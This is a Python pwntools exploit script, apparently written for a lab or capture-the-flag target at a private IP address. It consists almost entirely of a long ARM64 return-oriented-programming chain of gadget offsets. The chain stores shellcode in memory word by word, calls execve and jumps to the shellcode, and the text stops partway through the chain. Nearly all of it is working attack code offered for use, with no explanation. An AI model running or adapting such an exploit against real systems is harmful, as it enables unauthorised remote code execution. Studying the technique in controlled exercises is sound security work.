# Copyright (c) 2024, LMS57
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#     * Redistributions of source code must retain the above copyright notice,
#       this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice,this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the copyright holder nor the names of its
#       contributors may be used to endorse or promote products derived from
#       this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.


from pwn import *
#context.log_level = 'DEBUG'

#Call shellcode stored into memory
# Not 100% as the socket does not always read the entire payload
# Makes sense given the large number of functions utilized

p = remote('10.10.0.2',1234)

#store shellcode into memory, call execve, then jump to shellcode
chain = [
0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x104080, #add x2, x0
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
